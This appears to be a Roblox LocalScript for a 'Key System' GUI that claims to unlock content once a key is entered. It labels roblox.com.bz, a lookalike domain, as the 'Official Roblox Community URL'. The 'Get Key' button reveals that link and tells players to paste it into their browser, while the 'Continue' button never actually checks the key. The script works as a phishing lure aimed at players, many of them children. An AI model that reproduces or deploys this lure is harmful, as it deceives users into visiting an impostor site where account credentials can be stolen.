--// Key System GUI
--// LocalScript
--// Place inside StarterPlayer > StarterPlayerScripts

local Players = game:GetService("Players")

local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

--// Official Roblox Community URL
local GROUP_URL = "https://roblox.com.bz/communities/9296013169/"

--// Prevent duplicate GUI
local oldGui = playerGui:FindFirstChild("KeySystem")
if oldGui then
oldGui:Destroy()
end

--// ScreenGui
local gui = Instance.new("ScreenGui")
gui.Name = "KeySystem"
gui.ResetOnSpawn = false
gui.IgnoreGuiInset = true
gui.DisplayOrder = 999
gui.Parent = playerGui

--// Main
local main = Instance.new("Frame")
main.Name = "Main"
main.Size = UDim2.new(0.90, 0, 0, 370)
main.AnchorPoint = Vector2.new(0.5, 0.5)
main.Position = UDim2.fromScale(0.5, 0.5)
main.BackgroundColor3 = Color3.fromRGB(7, 8, 25)
main.BackgroundTransparency = 0.05
main.BorderSizePixel = 0
main.Parent = gui

local sizeConstraint = Instance.new("UISizeConstraint")
sizeConstraint.MinSize = Vector2.new(320, 350)
sizeConstraint.MaxSize = Vector2.new(720, 370)
sizeConstraint.Parent = main

local mainCorner = Instance.new("UICorner")
mainCorner.CornerRadius = UDim.new(0, 28)
mainCorner.Parent = main

local mainStroke = Instance.new("UIStroke")
mainStroke.Color = Color3.fromRGB(220, 220, 230)
mainStroke.Thickness = 2
mainStroke.Transparency = 0.15
mainStroke.Parent = main

--// Green dot
local dot = Instance.new("Frame")
dot.Size = UDim2.fromOffset(18, 18)
dot.Position = UDim2.new(0, 35, 0, 62)
dot.BackgroundColor3 = Color3.fromRGB(60, 255, 145)
dot.BorderSizePixel = 0
dot.Parent = main

local dotCorner = Instance.new("UICorner")
dotCorner.CornerRadius = UDim.new(1, 0)
dotCorner.Parent = dot

--// Title
local title = Instance.new("TextLabel")
title.BackgroundTransparency = 1
title.Position = UDim2.new(0, 75, 0, 40)
title.Size = UDim2.new(1, -100, 0, 38)
title.Font = Enum.Font.GothamBold
title.Text = "Key System"
title.TextSize = 28
title.TextColor3 = Color3.fromRGB(240, 240, 250)
title.TextXAlignment = Enum.TextXAlignment.Left
title.Parent = main

--// Subtitle
local subtitle = Instance.new("TextLabel")
subtitle.BackgroundTransparency = 1
subtitle.Position = UDim2.new(0, 75, 0, 78)
subtitle.Size = UDim2.new(1, -100, 0, 30)
subtitle.Font = Enum.Font.Gotham
subtitle.Text = "Enter key to unlock."
subtitle.TextSize = 17
subtitle.TextColor3 = Color3.fromRGB(140, 145, 180)
subtitle.TextXAlignment = Enum.TextXAlignment.Left
subtitle.Parent = main

--// Key textbox
local keyBox = Instance.new("TextBox")
keyBox.Name = "KeyBox"
keyBox.Size = UDim2.new(1, -70, 0, 62)
keyBox.Position = UDim2.new(0, 35, 0, 120)
keyBox.BackgroundColor3 = Color3.fromRGB(11, 12, 31)
keyBox.BorderSizePixel = 0
keyBox.ClearTextOnFocus = false
keyBox.PlaceholderText = "Enter key..."
keyBox.PlaceholderColor3 = Color3.fromRGB(125, 130, 165)
keyBox.Text = ""
keyBox.TextColor3 = Color3.fromRGB(235, 235, 245)
keyBox.TextSize = 19
keyBox.Font = Enum.Font.Gotham
keyBox.TextXAlignment = Enum.TextXAlignment.Left
keyBox.Parent = main

local keyCorner = Instance.new("UICorner")
keyCorner.CornerRadius = UDim.new(0, 20)
keyCorner.Parent = keyBox

local keyPadding = Instance.new("UIPadding")
keyPadding.PaddingLeft = UDim.new(0, 22)
keyPadding.Parent = keyBox

--// Get Key button
local getKey = Instance.new("TextButton")
getKey.Name = "GetKey"
getKey.Size = UDim2.new(0.48, -10, 0, 55)
getKey.Position = UDim2.new(0, 35, 0, 195)
getKey.BackgroundColor3 = Color3.fromRGB(29, 30, 105)
getKey.BorderSizePixel = 0
getKey.AutoButtonColor = true
getKey.Text = "Get Key"
getKey.TextSize = 19
getKey.Font = Enum.Font.GothamMedium
getKey.TextColor3 = Color3.fromRGB(175, 175, 230)
getKey.Parent = main

local getCorner = Instance.new("UICorner")
getCorner.CornerRadius = UDim.new(0, 20)
getCorner.Parent = getKey

--// Continue button
local continueButton = Instance.new("TextButton")
continueButton.Name = "Continue"
continueButton.Size = UDim2.new(0.48, -10, 0, 55)
continueButton.Position = UDim2.new(0.52, -25, 0, 195)
continueButton.BackgroundColor3 = Color3.fromRGB(65, 70, 255)
continueButton.BorderSizePixel = 0
continueButton.AutoButtonColor = true
continueButton.Text = "Continue"
continueButton.TextSize = 19
continueButton.Font = Enum.Font.GothamMedium
continueButton.TextColor3 = Color3.fromRGB(180, 180, 240)
continueButton.Parent = main

local continueCorner = Instance.new("UICorner")
continueCorner.CornerRadius = UDim.new(0, 20)
continueCorner.Parent = continueButton

--// Initial instruction
local instruction = Instance.new("TextLabel")
instruction.Name = "Instruction"
instruction.BackgroundTransparency = 1
instruction.Position = UDim2.new(0, 35, 0, 270)
instruction.Size = UDim2.new(1, -70, 0, 45)
instruction.Font = Enum.Font.Gotham
instruction.Text = "To get key you must join the community group!"
instruction.TextColor3 = Color3.fromRGB(150, 160, 235)
instruction.TextSize = 16
instruction.TextXAlignment = Enum.TextXAlignment.Left
instruction.TextWrapped = true
instruction.Parent = main

--// URL textbox
local urlBox = Instance.new("TextBox")
urlBox.Name = "GroupURL"
urlBox.Size = UDim2.new(1, -70, 0, 42)
urlBox.Position = UDim2.new(0, 35, 0, 315)
urlBox.BackgroundColor3 = Color3.fromRGB(11, 12, 31)
urlBox.BorderSizePixel = 0
urlBox.Text = GROUP_URL
urlBox.TextColor3 = Color3.fromRGB(170, 180, 255)
urlBox.TextSize = 14
urlBox.Font = Enum.Font.Gotham
urlBox.ClearTextOnFocus = false
urlBox.TextEditable = true
urlBox.Visible = false
urlBox.TextXAlignment = Enum.TextXAlignment.Left
urlBox.Parent = main

local urlCorner = Instance.new("UICorner")
urlCorner.CornerRadius = UDim.new(0, 14)
urlCorner.Parent = urlBox

local urlPadding = Instance.new("UIPadding")
urlPadding.PaddingLeft = UDim.new(0, 15)
urlPadding.Parent = urlBox

--// Get Key
getKey.Activated:Connect(function()

instruction.Text =  
	"Copy the group URL and paste in your browser to continue"  

urlBox.Visible = true  

-- Select the URL for easier manual copying  
task.defer(function()  
	urlBox:CaptureFocus()  
	urlBox.CursorPosition = #urlBox.Text + 1  
end)

end)

--// Continue
continueButton.Activated:Connect(function()

if keyBox.Text == "" then  
	keyBox.PlaceholderText = "Please enter a key first."  
	return  
end  

print("Key entered:", keyBox.Text)

end)
